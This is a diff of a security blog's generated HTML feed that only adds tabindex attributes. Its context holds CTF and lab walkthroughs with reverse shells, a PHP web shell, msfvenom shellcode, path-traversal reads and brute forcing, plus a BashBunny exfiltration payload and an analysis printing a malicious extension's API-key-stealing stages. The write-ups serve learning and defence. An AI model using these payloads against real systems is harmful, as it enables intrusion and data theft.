 <span style="color:#75715e"># This file is automatically generated by doxycannon. If you need changes,</span>
 <span style="color:#75715e"># make them to the template string in doxycannon.py</span>
@@ -1774,7 +2631,7 @@ the project directory:</p>
 <a href="004.jpg"> <img src="004.jpg" alt="004.jpg"> </a></p>
 <p>With the <code>--single</code> flag, DoxyCannon also has the ability to create a proxy rotator that provides a
 single port at which one can point GUI applications.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Start DoxyProxy</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Start DoxyProxy</span>
 ❯❯ ./doxycannon.py --single
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Writing HAProxy configuration
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Image doxyproxy built.
@@ -1809,7 +2666,7 @@ as the info is there, I&rsquo;m good.</p>
 <p>Check it out at <a href="https://github.com/audibleblink/bashynumb">https://github.com/audibleblink/bashynumb</a>.</p>
 <p>I&rsquo;ll be running it with <code>curl -sL git.io/bashynumb | bash</code>, but you probably shouldn&rsquo;t. =P</p>
 <p>Here&rsquo;s the 1st iteration, but always check github for the newest version.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/usr/bin/env bash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/usr/bin/env bash
 </span><span style="color:#75715e"></span>
 <span style="color:#75715e"># Thanks to arr0way for the section and banner code and some of the</span>
 <span style="color:#75715e"># enum calls - https://highon.coffee/blog/linux-local-enumeration-script</span>
@@ -1989,21 +2846,21 @@ in court. They can&rsquo;t turn over what they don&rsquo;t have.</p>
 </li>
 <li>
 <p>SSH in to the Pi. I used <code>nmap --open -p 22 192.168.1.1/24</code> to find the IP.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint"># default password is raspberry
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint"># default password is raspberry
 ssh -l pi 192.168.1.200
 </code></pre></li>
 <li>
 <p>CHANGE THE PASSWORD!</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">sudo passwd pi
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">sudo passwd pi
 </code></pre></li>
 <li>
 <p>Become root</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo su
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo su
 cd /root
 </code></pre></div></li>
 <li>
 <p>Download the setup script and run it as root. (Walkthrough of the script at the end of the post)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># download</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># download</span>
 wget https://raw.githubusercontent.com/audibleblink/vpn_access_point/master/setup.sh
 <span style="color:#75715e"># read and configure it</span>
 $EDITOR setup.sh
@@ -2021,7 +2878,7 @@ green text near the top of the page.</p>
 <h3 id="script-walkthrough">Script Walkthrough</h3>
 <p>Below you&rsquo;ll find the script as it was during the writing of this blog post, but with additional comments.
 For the most up-to-date version, check out <a href="https://github.com/audibleblink/vpn_access_point/">https://github.com/audibleblink/vpn_access_point/</a></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
 <span style="color:#75715e">#!/usr/bin/env bash</span>
 
 <span style="color:#75715e"># SETTINGS</span>
@@ -2174,12 +3031,12 @@ email address, to an attacker-controlled server.</p>
 <h2 id="the-code">The Code</h2>
 <p>The extension contains code that, upon visiting any site, generates a dynamic URL that changes
 daily. It uses an MD5 hash of the current date, using the d-m-yyyy format.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">// tomorrow&#39;s url
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">// tomorrow&#39;s url
 https://wd + md5(4-8-2017) + .win/ga.js
 https://wdfefe6195a8b014a1cc7d9cf2449d1b50.win/ga.js
 </code></pre></div><p>The following payload is fetched on every page that a victim navigates to. The payload is encoded and
 minified. Expanding it reveals the following portion:</p>
-<pre><code class="language-javascript.prettyprint" data-lang="javascript.prettyprint">if (top['location']['href']['indexOf']('cloudflare.com') &gt; -1) {
+<pre tabindex="0"><code class="language-javascript.prettyprint" data-lang="javascript.prettyprint">if (top['location']['href']['indexOf']('cloudflare.com') &gt; -1) {
   (function () {
     var _0xb2b9x1 = document['createElement']('script');
     _0xb2b9x1['type'] = 'text/javascript';
@@ -2191,7 +3048,7 @@ minified. Expanding it reveals the following portion:</p>
 </code></pre><p>The first-stage payload checks whether the victim is currently on cloudflare.com. If they are, it
 creates a new script tag on the page and sets its source to <code>//searchtab.win/ga.js</code>. This downloads
 stage 2 of the payload. If we look, we get the following script:</p>
-<pre><code class="language-javascript.prettyprint" data-lang="javascript.prettyprint">var xmlhttp = new XMLHttpRequest();
+<pre tabindex="0"><code class="language-javascript.prettyprint" data-lang="javascript.prettyprint">var xmlhttp = new XMLHttpRequest();
 xmlhttp.open('GET', 'https://www.cloudflare.com/api/v4/user/api_key', true);
 xmlhttp.setRequestHeader(&quot;x-atok&quot;, window.bootstrap.atok);
 xmlhttp.onreadystatechange = function() {
@@ -2236,7 +3093,7 @@ documents over a network interface or stealing account hashes from locked comput
 <p>We want to create a payload that allows for easy exfiltration from macOS. We also don&rsquo;t want to
 force the attacker to know the exact path of the files that are to be extracted; we should allow them
 to create bash commands whose output returns a list of files that are to be exfilled.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">
 # here we set an amber color to the LED so that the 
 # attacker knows that the payload has begun executing
 LED G R 500
@@ -2270,7 +3127,7 @@ files_to_copy=(
 be evaluated, but rather typed or passed to the victim, they must be escaped with a backslash.</p>
 <p>In the second half of the payload, we&rsquo;re defining strings that are going to by typed by the
 BashBunny on the victim computer. This is why you&rsquo;ll see it peppered with <code>\\</code></p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">
 # these command instruct the BashBunny to act as a keyboard and physically
 # type the commands
 
@@ -2324,7 +3181,7 @@ manually test? NO! The hallmarks of any decent programmer/hacker is laziness. So
 <h3 id="netcat-and-iptables">netcat and iptables</h3>
 <p><strong>For the attacker</strong></p>
 <p>Set all ports to redirect to a listener you&rsquo;ve started.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">iface=eth0
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">iface=eth0
 ip=66.66.66.66
 lport=8080
 
@@ -2332,7 +3189,7 @@ iptables -t nat -A PREROUTING -i $iface -p tcp --dport 1:65535 -j DNAT --to-dest
 nc -nvlp $lport
 </code></pre><p><strong>For the victim machine</strong></p>
 <p>*nix:</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">for port in (1..1000); do
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">for port in (1..1000); do
   echo &quot;Trying $port&quot;
   nc -z -w1 66.66.66.66 $port
 done
@@ -2342,7 +3199,7 @@ runs.</p>
 <h3 id="wireshark">wireshark</h3>
 <p>If you have a GUI available on the attacking machine, you can repeat the above scenario, but
 substitute the iptables and nc commands for wireshark with a sane filter; something like</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ip.src == 23.23.23.23
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ip.src == 23.23.23.23
 </code></pre><p>You should be able to watch the window for incoming packets and determine on which port
 the victim machine was able to connect.</p>
 <h3 id="egress-buster">egress-buster</h3>
@@ -2368,9 +3225,9 @@ initial network, you can use it as a proxy to other machines on the &ldquo;hidde
 <p>The ssh client has an often-overlooked configuration file that resides in your <code>~/.ssh</code> folder. You can
 configure things in here that are specific to certain hosts or you can set default configurations for every
 host. In order to access remote networks, wouldn&rsquo;t it be nice to shorten a command like:</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ssh -l user -L 127.0.0.1:5432:132.31.321.123:5432 -p 20222 -i ~/.ssh/db/id_rsa remote.server.com
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ssh -l user -L 127.0.0.1:5432:132.31.321.123:5432 -p 20222 -i ~/.ssh/db/id_rsa remote.server.com
 </code></pre><p>to something like:</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ssh mount_psql
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ssh mount_psql
 </code></pre><h3 id="ssh-config-file">SSH Config file</h3>
 <p>This file has a <em>lot</em> of configuration options, but we&rsquo;re just going to focus on the one&rsquo;s that help us
 pivot through 2+ networks.</p>
@@ -2396,14 +3253,14 @@ will just reuse the same authenticated socket, so it&rsquo;s lighting fast.</p>
 them, but the whole process is much smoother if you upload keys to each of them. The cool thing about the ssh
 config file is that any program that uses ssh on the backend, can also use this file. So if you configure a
 server entry called <code>skynet</code>&hellip;</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ssh skynet
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ssh skynet
 scp file.txt skynet:/tmp
 rsync -avr skynet ...
 ssh-copy-id -i ~/.ssh/id_rsa skynet
 </code></pre><p>^ All of those work.</p>
 <p>So let&rsquo;s configure our <code>~/.ssh/config</code> file. Let&rsquo;s also assume root login is enabled on all the machines and
 that we&rsquo;ve already copied our ssh keys onto the remote machines.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ControlMaster auto
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ControlMaster auto
 ControlPath /tmp/ssh_mux_%h_%p_%r
 ServerAliveInterval 60 
 
@@ -2467,7 +3324,7 @@ automated tools were going to make this challenge harder, not easier.</p>
 <p><img src="https://i.imgur.com/WwMxNnj.png" alt="">
 <img src="https://i.imgur.com/IS2BlBh.png" alt=""></p>
 <p>At this point, I decided to automate my enumeration of pages with a custom script.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">for word in $(cat /usr/share/dirb/wordlists/common.txt); do
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">for word in $(cat /usr/share/dirb/wordlists/common.txt); do
     
     # find pages whose last line does NOT contain the phrase 'what are you trying' ( a 404, essentially )
     curl -q &quot;vm:60080/?page=$word&quot; 2&gt;/dev/null | tail -1 | grep -v 'what are you trying'
@@ -2478,7 +3335,7 @@ automated tools were going to make this challenge harder, not easier.</p>
     fi
 done | grep -v &quot;/&quot; # don't print results with slashes in them, they're false positives
 </code></pre><p>This output yielded the pages.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">contact
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">contact
 mailer
 home
 index
@@ -2490,7 +3347,7 @@ name
 <p><img src="https://i.imgur.com/9Yu6Zky.png" alt=""></p>
 <p>From here we can set up a listener and run a reverse shell by feeding in url encoded commands to the <code>mail</code>
 query parameter:</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.177/443 0&gt;&amp;1&quot;
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.177/443 0&gt;&amp;1&quot;
 
 # becomes
 
@@ -2509,7 +3366,7 @@ machine.</p>
 <p>The code for the and configs for the bot are located in <code>/home/wallaby/.sopel</code> and it indicates that we need
 to assume the nickname <code>waldo</code> in order for us to be able to use this command. We can&rsquo;t do that while waldo
 is still logged in so we boot them off with the use of our firewall.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">sudo iptables -I OUTPUT -p tcp -m owner --uid-owner 1000 --dport 6667 -s 127.0.0.1 -j DROP
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">sudo iptables -I OUTPUT -p tcp -m owner --uid-owner 1000 --dport 6667 -s 127.0.0.1 -j DROP
 </code></pre><p><img src="https://i.imgur.com/KCH7TX6.png" alt=""></p>
 <p>In a while, after a timeout, only <code>waldo</code> should be ejected from the room, leaving the ability to steal his
 nick and command the bot.</p>
@@ -2548,17 +3405,17 @@ ran every 20 minutes as the <code>root</code> user and that the script was writa
 leveraged to create a <code>root</code> shell by replacing the file contents with a malicious payload.</p>
 <h2 id="execution">Execution</h2>
 <p>An initial recon scan on the target revealed the following services:</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; onetwopunch -t ip_addresses.txt -p tcp
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; onetwopunch -t ip_addresses.txt -p tcp
 </code></pre><p><img src="https://i.imgur.com/YeosV0b.png" alt=""></p>
 <p>All together, individual inspection of the services revealed a plethora of information about the company and
 its employees.
 This section will cover the most direct route to <code>root</code>,
 but see the <a href="#additional-discovery">Additional Discovery</a> section for that information.</p>
 <p>Using <code>nikto</code> against the service on port <code>12380</code> revealed additional paths using the https protocol.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; nikto -host vm:12380
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; nikto -host vm:12380
 </code></pre><p><img src="https://i.imgur.com/DTF5i00.png" alt=""></p>
 <p>The site hosted at <code>/blogblog</code> is a Wordpress blog with a vulnerable plug-in, as discovered by <code>wpscan</code>.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">wpscan -u https://vm:12380/blogblog/
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">wpscan -u https://vm:12380/blogblog/
 </code></pre><p><img src="https://i.imgur.com/uzdO1dx.png" alt="">
 <img src="https://i.imgur.com/U2NyDnu.png" alt="">
 <img src="https://i.imgur.com/LrEOKFq.png" alt=""></p>
@@ -2566,7 +3423,7 @@ but see the <a href="#additional-discovery">Additional Discovery</a> section for
 of a file on the system by using that file as a &ldquo;thumbnail&rdquo; for a post. An attacker could use this to read
 the contents of the Wordpress configuration file which has database credentials. The user account list for
 this machine was also acquired using this method.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; curl -k &quot;https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=9898092807434134&amp;short=rnd&amp;term=rnd&amp;thumb=../../../../../etc/passwd&quot;
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; curl -k &quot;https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=9898092807434134&amp;short=rnd&amp;term=rnd&amp;thumb=../../../../../etc/passwd&quot;
 &gt;&gt; curl -k &quot;https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=9898092807434134&amp;short=rnd&amp;term=rnd&amp;thumb=../wp-config.php&quot;
 </code></pre><p><img src="https://i.imgur.com/XMcARrC.png" alt=""></p>
 <p>By curling the &ldquo;image&rdquo; urls, the contents can be read.</p>
@@ -2574,13 +3431,13 @@ this machine was also acquired using this method.</p>
 <img src="https://i.imgur.com/rfez3zi.png" alt=""></p>
 <p>With credentials and an open 3306 port, an attacker can log in and create a malicious file that would allow
 remote code execution.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; mysql -h vm -u root -p wordpress
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; mysql -h vm -u root -p wordpress
 
 mysql&gt;&gt; SELECT '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' INTO OUTFILE '/root/www/rce.php'
 </code></pre><p><img src="https://i.imgur.com/h0gsLrZ.png" alt=""></p>
 <p>With remote code execution enabled, an attacker can download a malicious payload that initiates a reverse
 shell.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint"># start a web server to host the payload
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint"># start a web server to host the payload
 &gt;&gt; systemctl start apache2
 
 #create the payload in the web directory
@@ -2591,7 +3448,7 @@ shell.</p>
 &gt;&gt; curl &quot;vm/rce.php?cmd=ls&quot;
 </code></pre><p><img src="https://i.imgur.com/5WdoFhk.png" alt=""></p>
 <p>A listener/handler is configured and the reverse shell kicked off on the victim computer</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; msfconsole -x &quot;use exploit/multi/handler&quot;
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; msfconsole -x &quot;use exploit/multi/handler&quot;
 
 msfconsole&gt;&gt; set PAYLOAD php/meterpreter_reverse_tcp
 msfconsolemsfconsole&gt;&gt; set LPORT 443
@@ -2625,11 +3482,11 @@ running a web server from their home directory.
 <p>The Wordpress site could have been used as another vector for a shell by adding a reverse shell plug-in. The
 users and passwords were crackable with the rockyou word list. Some users also reused their Wordpress
 passwords for their machine accounts.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; wpscan -u https://vm:12380/blogblog/ --enumerate u
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; wpscan -u https://vm:12380/blogblog/ --enumerate u
 </code></pre><p><img src="https://i.imgur.com/v1GKKbb.png" alt=""></p>
 <p>Without accessing the computer&rsquo;s <code>/etc/passwd</code> file, this gathering of information revealed the existence of
 the following employees and a accounts:</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">barry
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">barry
 dave
 elly
 fred
@@ -2672,29 +3529,29 @@ exploration, an outdated version of <code>chkrootkit</code> was found. By exploi
 <h2 id="proof-of-concept">Proof of Concept</h2>
 <p>In order to cut down on typing, once the IP of the victim computer is discovered, it can be added to the
 <code>/etc/hosts</code>.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">echo &quot;192.168.1.188 vm&quot; &gt;&gt; /etc/hosts
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">echo &quot;192.168.1.188 vm&quot; &gt;&gt; /etc/hosts
 </code></pre><p>We begin with scanning the victim&rsquo;s machine and find ports 80 and 22.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ nmap -p - -A vm | tee nmap.scan
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ nmap -p - -A vm | tee nmap.scan
 </code></pre><p><img src="https://i.imgur.com/jQr872J.png" alt=""></p>
 <p>Navigating to the page and checking its source code reveals nothing</p>
 <p><img src="https://i.imgur.com/1Oigcfa.png" alt=""></p>
 <p>Running <code>uniscan</code>, a folder named <code>test</code> is discovered</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ uniscan -qweds -u http://vm/ 
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ uniscan -qweds -u http://vm/ 
 </code></pre><p><img src="https://i.imgur.com/wU5Wp2v.png" alt=""></p>
 <p>The listing appeared to be empty but further examination of the <code>/test</code> path revealed that it responded to
 more than just HTTP methods. <code>COPY</code> and <code>MOVE</code> seemed to indicate WebDAV.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ curl -vX OPTIONS vm/test
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ curl -vX OPTIONS vm/test
 </code></pre><p><img src="https://i.imgur.com/6GKZJbc.png" alt=""></p>
 <p>This path requires no authentication and thus allows attackers to upload files to the web server.</p>
 <p><img src="https://i.imgur.com/gSzuoHZ.png" alt=""></p>
 <p>Verifying successful upload:</p>
 <p><img src="https://i.imgur.com/CpTqKyO.png" alt=""></p>
 <p>Having uploaded the reverse shell, the Meterpreter handler is constructed</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">set PAYLOAD php/meterpreter/reverse_tcp
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">set PAYLOAD php/meterpreter/reverse_tcp
 set LHOST 80
 run -j
 </code></pre><p>&hellip;and the payload is activated.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">curl http://vm/test/sshhh.php
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">curl http://vm/test/sshhh.php
 </code></pre><p><img src="https://i.imgur.com/XQ3a9Q4.png" alt=""></p>
 <p>Once a shell has been established on the system, an enumeration script reveals what additional
 vulnerabilities might lead to a full compromise.</p>
@@ -2721,7 +3578,7 @@ Ok, so web only. Great. nikto didn&amp;rsquo;t reveal any low-hanging fruit so l
 Check that out! Our first flag was hidden in http://imf/contact.php. This looks like base64.</description>
             <content type="html"><![CDATA[<p>After mapping the network and finding our IP address at <code>192.168.1.162</code>, we can add it to our <code>/etc/hosts</code>
 temporarily to make things a little easier for us.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">echo &quot;192.168.1.162     imf&quot; &gt;&gt; /etc/hosts
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">echo &quot;192.168.1.162     imf&quot; &gt;&gt; /etc/hosts
 </code></pre><p>Lets see what kind of machine we&rsquo;re dealing with.</p>
 <p><img src="https://i.imgur.com/1DmhXnq.png" alt=""></p>
 <p>Ok, so web only. Great. <code>nikto</code> didn&rsquo;t reveal any low-hanging fruit so let&rsquo;s dive into the source.</p>
@@ -2751,7 +3608,7 @@ changing the name of the form&rsquo;s password field from <code>pass</code> to <
 <p>With the modified form, a BS password, and a username from the Contacts page, we get&hellip;</p>
 <p><img src="https://i.imgur.com/wB0UUP3.png" alt=""></p>
 <p>The decoded flag just has us click through to the CMS</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">root@kali:~                                                                                                                                                                                     ⍉
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">root@kali:~                                                                                                                                                                                     ⍉
 ❯❯ echo Y29udGludWVUT2Ntcw== | base64 -d
 continueTOcms
 </code></pre><p>The CMS has 3 pages to choose from and none of them seemed to have any relevant info. I tried (too long) to
@@ -2765,7 +3622,7 @@ when I saw this:</p>
 <p>Looks like we have an image at <code>imfadministrator/images/whiteboard.jpg</code></p>
 <p><img src="https://i.imgur.com/BBLfAQY.png" alt=""></p>
 <p>The QR Code is our next flag <code>flag4{dXBsb2FkcjkOMi5waHA=}</code></p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">root@kali:~                                                                                                                                                                                     ⍉
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">root@kali:~                                                                                                                                                                                     ⍉
 ❯❯ echo dXBsb2Fkcjk0Mi5waHA= | base64 -d
 uploadr942.php   
 </code></pre><p>We navigate to <code>http://imf/imfadministrator/uploadr942.php</code> and we get our uploader. After messing around
@@ -2777,7 +3634,7 @@ db so it gets executed.</p>
 <p>Let&rsquo;s upload it!</p>
 <p><img src="https://i.imgur.com/ePzjKU9.png" alt=""></p>
 <p>Haha! Whoops. Alright what about just regular command execution:</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">cat &lt;&lt;EOF &gt; muahaha.gif
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">cat &lt;&lt;EOF &gt; muahaha.gif
 GIF89a
 &lt;?php \`id\` ?&gt;
 </code></pre><p>Since CrappyWAF detects functions calls, we should modify our script to take the command from a query
@@ -2821,8 +3678,8 @@ address in EIP.</p>
 <p><img src="https://i.imgur.com/R7BFi8b.png" alt="">
 <img src="https://i.imgur.com/3yWsjBr.png" alt=""></p>
 <p>Lets generate our shellcode and start to write the exploit.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.161 LPORT=4444 -f ruby -b &quot;\x00\x0a\x0d&quot;
-</code></pre><pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">require 'socket'
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.161 LPORT=4444 -f ruby -b &quot;\x00\x0a\x0d&quot;
+</code></pre><pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">require 'socket'
 
 host = '192.168.1.162'
 
@@ -2892,7 +3749,7 @@ up anything useful so I try to log in as an anonymous user and bingo; next clue.
 <p><img src="images/Screenshot2016-10-2111:44:15.png" alt=""></p>
 <p>So we get the string &lsquo;sup3rs3cr3tdirlol&rsquo;. Navigating there gets a directory listing with one file. Let&rsquo;s
 download it.</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">$&gt; curl -L 192.168.110.103/sup3rs3cr3tdirlol/roflmao
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">$&gt; curl -L 192.168.110.103/sup3rs3cr3tdirlol/roflmao
 $&gt; file roflmao
 # shows it's a binary file
 
@@ -2908,7 +3765,7 @@ literally. That, and it wasn&rsquo;t a real memory address at only 3 bytes long.
 <p>Awesome! I downloaded the files which had what looked like usernames and a single password. One folder was
 called &lsquo;this_folder_contains_the_password&rsquo;. Again, taking things literally, I made a quick and dirty script
 to take all the words in this folder and append them to my wordlist.</p>
-<pre><code class="language-ruby.prettyprint" data-lang="ruby.prettyprint">require 'nokogiri'
+<pre tabindex="0"><code class="language-ruby.prettyprint" data-lang="ruby.prettyprint">require 'nokogiri'
 require 'open-uri'
 
 url = 'http://192.168.110.103/0x0856BF/this_folder_contains_the_password'
@@ -2925,7 +3782,7 @@ def print_tree(node, list = [])
 end
 
 puts print_tree(page).to_a.sort.uniq
-</code></pre><pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ruby scrape.rb &gt;&gt; word.list
+</code></pre><pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ruby scrape.rb &gt;&gt; word.list
 </code></pre><p>This seemed like a good time to attack the ssh port with <code>hydra</code> and our new lists. After a couple of
 attempts, the SSH port stopped letting me try to authenticate. I went through the attack again, reversing the
 user list, password list, then both, waiting for the ssh port to reset between attempts. And then&hellip;</p>
@@ -2936,7 +3793,7 @@ user list, password list, then both, waiting for the ssh port to reset between a
 <p>In the meantime, I uploaded an enumeration script to <code>/tmp</code>, but notice that it also gets deleted about every
 2 minutes. Another cron job?</p>
 <p>I tried to manually see if there were any SUID binaries to exploit or any world-writable files</p>
-<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">find / --perm 6000
+<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">find / --perm 6000
 find / --perm 0777
 </code></pre><p>There are! It&rsquo;s a long list but 1 stands out: <code>/lib/log/cleaner.py</code> The contents of the file looks
 like it wipes the <code>/tmp</code> directory. This must be the file that <code>cron</code> runs.</p>
